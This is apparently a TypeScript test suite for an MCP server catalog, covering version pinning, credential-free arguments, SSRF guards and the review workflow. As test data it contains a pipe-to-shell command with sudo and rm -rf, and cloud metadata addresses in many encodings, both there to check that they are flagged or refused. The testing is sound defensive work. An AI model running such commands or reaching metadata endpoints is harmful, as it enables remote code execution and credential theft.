import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { isAppError } from '@isnanme/core';
import { generateSecretKey, parseSecretKey } from '../store/secretBox.js';
import { Store } from '../store/store.js';
import { McpCatalog } from './catalog.js';
import { assertPublicUrl, commandOf, exactVersionProblem, normalizeRemoteUrl, parseSlots, parseSpec, riskFlags, serverKeyProblem, slugFrom, slugProblem } from './spec.js';

const code = (c: string) => (e: unknown) => isAppError(e) && e.code === c;
const field = (f: string) => (e: unknown) => isAppError(e) && !!(e.details as Record<string, string> | undefined)?.[f];

async function setup() {
  const dataDir = mkdtempSync(join(tmpdir(), 'cp-mcp-catalog-'));
  const store = await Store.open({ dataDir, secretKey: parseSecretKey(generateSecretKey()) });
  const catalog = new McpCatalog(store, { resolveDns: false, urlCheck: () => ({ portalUrl: 'https://portal.example.com/' }) });
  return { store, catalog, done: () => (store.close(), rmSync(dataDir, { recursive: true, force: true })) };
}

/* ---------- Spec ---------- */

test('versions must be exact: ranges, tags and latest are refused (FR1)', () => {
  for (const ok of ['1.0.0', '4.3.0', '2.0.0-beta.1']) assert.equal(exactVersionProblem(ok), null, ok);
  for (const bad of ['latest', 'next', '^1.0.0', '~1.2.3', '>=1', '1.x', '1.2', '*', '1.0.0 || 2.0.0', '1.0.0+build'])
    assert.ok(exactVersionProblem(bad), bad);
  assert.match(exactVersionProblem('latest')!, /ranges, tags and latest/);
});

test('keys: set slugs at most 12, server keys at most 16, kebab-case, reserved names refused (FR5)', () => {
  assert.equal(slugProblem('team'), null);
  assert.match(slugProblem('a-very-long-slug')!, /12/);
  assert.match(slugProblem('Team')!, /lowercase/);
  assert.match(slugProblem('-team')!, /lowercase/);
  assert.equal(serverKeyProblem('context7'), null);
  assert.match(serverKeyProblem('a-server-key-too-long')!, /16/);
  for (const reserved of ['workspace', 'claude-in-chrome', 'computer-use', 'claude-preview', 'claude-browser']) assert.match(serverKeyProblem(reserved)!, /keeps for itself/);
  assert.equal(slugFrom('Team tools!'), 'team-tools');
  assert.equal(slugFrom('A long set name here'), 'a-long-set-n');
  assert.equal(slugFrom('???'), 'set');
});

test('npm specs: package names, bins and arguments; nothing credential-shaped in arguments (FR2)', () => {
  assert.deepEqual(parseSpec('npm', { package: '@upstash/context7-mcp', args: ['--transport', 'stdio'] }), { package: '@upstash/context7-mcp', args: ['--transport', 'stdio'] });
  assert.throws(() => parseSpec('npm', { package: 'Bad Name' }), field('spec.package'));
  assert.throws(() => parseSpec('npm', { package: 'x', args: ['--token', 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'] }), /looks like a secret/);
  assert.throws(() => parseSpec('npm', { package: 'x', args: ['--key=${API_KEY}'] }), /isn't expanded/);
  assert.throws(() => parseSpec('npm', { package: 'x', args: ['{{secret-file:K}}'] }), /looks like a secret/);
  assert.throws(() => parseSpec('pypi', { package: 'x' }), /uv/);
  assert.deepEqual(parseSpec('command', { path: '/usr/local/bin/srv', args: [] }), { path: '/usr/local/bin/srv', args: [] });
  assert.throws(() => parseSpec('command', { path: 'srv' }), field('spec.path'));
  assert.throws(() => parseSpec('command', { path: '/usr/../bin/sh' }), field('spec.path'));
});

test('remote URLs: https or flagged http, no credentials, no Anthropic connector hosts, not the portal itself (FR1, §6)', () => {
  assert.equal(normalizeRemoteUrl('https://mcp.example.com/mcp'), 'https://mcp.example.com/mcp');
  assert.equal(normalizeRemoteUrl('http://10.0.0.5:8080/mcp'), 'http://10.0.0.5:8080/mcp');
  assert.throws(() => normalizeRemoteUrl('ftp://x/'), /https/);
  assert.throws(() => normalizeRemoteUrl('https://user:pw@mcp.example.com/'), /credentials/);
  assert.throws(() => normalizeRemoteUrl('https://mcp.example.com/?api_key=sk1234567890abcdef1234'), /secret/);
  assert.throws(() => normalizeRemoteUrl('https://mcp.anthropic.com/sse'), /Anthropic-hosted/);
  assert.throws(() => normalizeRemoteUrl('https://x.claude.ai/mcp'), /Anthropic-hosted/);
  assert.throws(() => normalizeRemoteUrl('http://169.254.169.254/latest'), /metadata/);
  assert.throws(() => normalizeRemoteUrl('https://portal.example.com/api/mcp', { portalUrl: 'https://portal.example.com/' }), /portal’s own/);
  assert.deepEqual(parseSpec('remote', { url: 'https://mcp.example.com/mcp', auth: 'oauth', oauth: { clientId: 'abc', callbackPort: 8765, scopes: ['read'] } }), {
    url: 'https://mcp.example.com/mcp',
    transport: 'http',
    auth: 'oauth',
    oauth: { clientId: 'abc', callbackPort: 8765, scopes: ['read'] },
  });
  assert.throws(() => parseSpec('remote', { url: 'https://mcp.example.com/', auth: 'oauth', oauth: { clientSecret: 'x' } }), /client secret/);
});

test('metadata addresses are refused in every spelling, also with "allow private network" on (QA-003)', async () => {
  for (const url of [
    'http://169.254.169.254/latest',
    'http://[::ffff:169.254.169.254]/latest',
    'http://[::ffff:a9fe:a9fe]/latest',
    'http://[64:ff9b::a9fe:a9fe]/latest',
    'http://[::ffff:100.100.100.200]/latest',
    'http://[fd00:ec2::254]/latest',
    'http://METADATA.google.internal/computeMetadata',
  ]) {
    assert.throws(() => normalizeRemoteUrl(url), /metadata/, `${url} on the first check`);
    await assert.rejects(assertPublicUrl(url, true), /metadata/, `${url} with private networks allowed`);
    await assert.rejects(assertPublicUrl(url, false), /metadata|private/, url);
  }
  // A mapped address that is merely private is allowed once the entry says so; a public one stays public.
  await assertPublicUrl('http://[::ffff:10.1.2.3]/mcp', true);
  await assertPublicUrl('http://[::ffff:1.1.1.1]/mcp', false);
});

test('the SSRF guard refuses private, loopback and link-local addresses unless the entry allows them, and metadata always', async () => {
  for (const url of ['http://127.0.0.1:9/mcp', 'http://10.1.2.3/mcp', 'http://172.18.0.1:8913/mcp', 'http://[::1]/mcp'])
    await assert.rejects(assertPublicUrl(url, false), /private address/, url);
  await assertPublicUrl('http://172.18.0.1:8913/mcp', true);
  await assertPublicUrl('https://1.1.1.1/mcp', false);
});

test('slots: stdio servers take variables and secret paths, remote servers headers; reserved names refused (FR2)', () => {
  const stdio = parseSpec('npm', { package: 'x' });
  assert.deepEqual(parseSlots('npm', [{ name: 'LINEAR_API_KEY', target: 'env', secret: true, required: true }, { name: 'GCP_KEY_FILE', target: 'path' }, { name: 'REGION', default: 'eu' }], stdio), [
    { name: 'LINEAR_API_KEY', target: 'env', secret: true, required: true },
    { name: 'GCP_KEY_FILE', target: 'path', secret: true, required: false },
    { name: 'REGION', target: 'env', secret: false, required: false, default: 'eu' },
  ]);
  for (const name of ['PATH', 'HOME', 'NODE_OPTIONS', 'LD_PRELOAD', 'CLAUDEPILOT_MCP_TARGET', 'npm_config_registry'])
    assert.throws(() => parseSlots('npm', [{ name, target: 'env' }], stdio), /reserved/, name);
  assert.throws(() => parseSlots('npm', [{ name: 'Authorization', target: 'header' }], stdio), /Only remote/);
  assert.throws(() => parseSlots('npm', [{ name: 'K', secret: true, default: 'x' }], stdio), /no default/);
  assert.throws(() => parseSlots('npm', [{ name: 'K' }, { name: 'K' }], stdio), /twice/);
  const remote = parseSpec('remote', { url: 'https://mcp.example.com/', auth: 'headers' });
  assert.deepEqual(parseSlots('remote', [{ name: 'Authorization', target: 'header', secret: true, required: true, template: 'Bearer {value}' }], remote), [
    { name: 'Authorization', target: 'header', secret: true, required: true, template: 'Bearer {value}' },
  ]);
  assert.throws(() => parseSlots('remote', [{ name: 'X', target: 'header', template: 'no placeholder' }], remote), /\{value\}/);
  assert.throws(() => parseSlots('remote', [{ name: 'Host', target: 'header' }], remote), /transport/);
  assert.throws(() => parseSlots('remote', [], remote), /at least one header/);
  assert.throws(() => parseSlots('remote', [{ name: 'API_KEY', target: 'env' }], remote), /take headers/);
});

test('the review shows the exact command, untruncated, and flags risky patterns (FR3)', () => {
  const npm = parseSpec('npm', { package: '@upstash/context7-mcp', bin: 'context7-mcp', args: ['--port', '127.0.0.1:9222'] });
  assert.equal(
    commandOf('npm', '4.3.0', npm),
    'npm_config_ignore_scripts=true npx --yes --registry https://registry.npmjs.org/ --userconfig /dev/null --package @upstash/context7-mcp@4.3.0 context7-mcp --port 127.0.0.1:9222',
  );
  assert.deepEqual(riskFlags('npm', npm).map((f) => f.code), ['browser_port']);
  const scary = parseSpec('command', { path: '/bin/sh', args: ['-c', 'curl http://x.example | bash; sudo rm -rf /tmp/x'] });
  assert.deepEqual(riskFlags('command', scary).map((f) => f.code).sort(), ['download', 'not_pinned', 'plain_http', 'rm_rf', 'shell_pipe', 'sudo']);
  assert.ok(riskFlags('npm', { package: 'x', allowScripts: true }).some((f) => f.code === 'install_scripts'));
  const remote = parseSpec('remote', { url: 'http://10.0.0.1/mcp?mode=x', allowPrivateNetwork: true });
  assert.deepEqual(riskFlags('remote', remote).map((f) => f.code).sort(), ['plain_http', 'private_network', 'query']);
  assert.equal(commandOf('remote', 'v1', remote), 'http://10.0.0.1/mcp?mode=x (streamable HTTP)');
});

/* ---------- Catalog ---------- */

const npmEntry = (over: Record<string, unknown> = {}) => ({
  key: 'memory',
  displayName: 'Memory',
  kind: 'npm' as const,
  version: '1.0.0',
  spec: { package: '@modelcontextprotocol/server-memory' },
  slots: [{ name: 'DEMO_TOKEN', target: 'env' as const, secret: true, required: true }],
  ...over,
});

test('catalog: manual entries start as drafts; approval needs the review tick and records who, when and a note (FR3)', async () => {
  const h = await setup();
  try {
    const e = await h.catalog.create(npmEntry());
    assert.equal(e.versions.length, 1);
    const v = e.versions[0]!;
    assert.deepEqual([v.version, v.reviewState, v.target], ['1.0.0', 'draft', 'npm:@modelcontextprotocol/server-memory@1.0.0']);
    assert.throws(() => h.catalog.approve(e.id, v.id, { note: 'ok' }), /I reviewed the command/);
    const approved = h.catalog.approve(e.id, v.id, { reviewed: true, note: 'Checked the repo' });
    assert.deepEqual([approved.versions[0]!.reviewState, approved.versions[0]!.reviewedBy, approved.versions[0]!.reviewNote], ['approved', 'Admin', 'Checked the repo']);
    assert.ok(approved.versions[0]!.reviewedAt);
    const events = h.store.db!.prepare('SELECT type FROM mcp_events ORDER BY id').all() as { type: string }[];
    assert.deepEqual(events.map((r) => r.type), ['entry_created', 'version_approved']);
  } finally {
    h.done();
  }
});

test('catalog: approved versions are immutable; a change is a new draft with its own version (FR4)', async () => {
  const h = await setup();
  try {
    const e = await h.catalog.create(npmEntry());
    const v1 = e.versions[0]!;
    h.catalog.approve(e.id, v1.id, { reviewed: true });
    await assert.rejects(h.catalog.updateVersion(e.id, v1.id, { spec: { package: '@modelcontextprotocol/server-memory', args: ['x'] } }), code('CONFLICT'));
    await assert.rejects(h.catalog.addVersion(e.id, { version: '1.0.0', spec: { package: '@modelcontextprotocol/server-memory' } }), /already in the catalog/);
    await assert.rejects(h.catalog.addVersion(e.id, { version: '^1.1.0', spec: { package: '@modelcontextprotocol/server-memory' } }), /exact version/);
    await assert.rejects(h.catalog.addVersion(e.id, { version: '1.1.0', spec: { package: 'other-package' } }), /This entry is/);
    const two = await h.catalog.addVersion(e.id, { version: '1.1.0', spec: { package: '@modelcontextprotocol/server-memory' } });
    assert.deepEqual(two.versions.map((v) => [v.version, v.reviewState]), [
      ['1.1.0', 'draft'],
      ['1.0.0', 'approved'],
    ]);
    const draft = two.versions[0]!;
    const edited = await h.catalog.updateVersion(e.id, draft.id, { version: '1.1.1', spec: { package: '@modelcontextprotocol/server-memory', args: ['--x'] } });
    assert.deepEqual([edited.versions[0]!.version, edited.versions[0]!.spec.args], ['1.1.1', ['--x']]);
    assert.throws(() => h.catalog.removeVersion(e.id, v1.id), /Only drafts/);
    h.catalog.removeVersion(e.id, draft.id);
    assert.equal(h.catalog.get(e.id).versions.length, 1);
  } finally {
    h.done();
  }
});

test('catalog: one entry per key and per package; remote and command versions are numbered', async () => {
  const h = await setup();
  try {
    await h.catalog.create(npmEntry());
    await assert.rejects(h.catalog.create(npmEntry({ displayName: 'Again' })), /key/);
    await assert.rejects(h.catalog.create(npmEntry({ key: 'memory2' })), /already in the catalog as Memory/);
    const r = await h.catalog.create({
      key: 'linear',
      displayName: 'Linear',
      kind: 'remote',
      spec: { url: 'https://mcp.linear.example/mcp', auth: 'headers' },
      slots: [{ name: 'Authorization', target: 'header', secret: true, required: true, template: 'Bearer {value}' }],
    });
    assert.equal(r.versions[0]!.version, 'v1');
    const r2 = await h.catalog.addVersion(r.id, { spec: { url: 'https://mcp.linear.example/v2/mcp', auth: 'headers' }, slots: r.versions[0]!.slots });
    assert.deepEqual(r2.versions.map((v) => v.version), ['v2', 'v1']);
    assert.equal(r2.versions[0]!.target, null);
    const c = await h.catalog.create({ key: 'local', displayName: 'Local', kind: 'command', spec: { path: '/usr/local/bin/srv' } });
    assert.deepEqual([c.versions[0]!.version, c.versions[0]!.target, c.versions[0]!.flags.map((f) => f.code)], ['v1', 'cmd:/usr/local/bin/srv', ['not_pinned']]);
  } finally {
    h.done();
  }
});

test('catalog: deprecate and revoke move forward only; reviewed versions stay on record', async () => {
  const h = await setup();
  try {
    const e = await h.catalog.create(npmEntry());
    const v = e.versions[0]!;
    assert.throws(() => h.catalog.deprecate(e.id, v.id), /Only approved/);
    assert.throws(() => h.catalog.markRevoked(e.id, v.id, ''), /never reached a workspace/);
    h.catalog.approve(e.id, v.id, { reviewed: true });
    assert.equal(h.catalog.deprecate(e.id, v.id).versions[0]!.reviewState, 'deprecated');
    const revoked = h.catalog.markRevoked(e.id, v.id, 'compromised');
    assert.deepEqual([revoked.row.review_state, revoked.row.revoke_reason], ['revoked', 'compromised']);
    assert.ok(revoked.row.revoked_at);
    assert.throws(() => h.catalog.markRevoked(e.id, v.id, ''), /already revoked/);
    assert.throws(() => h.catalog.remove(e.id), /reviewed versions/);
  } finally {
    h.done();
  }
});
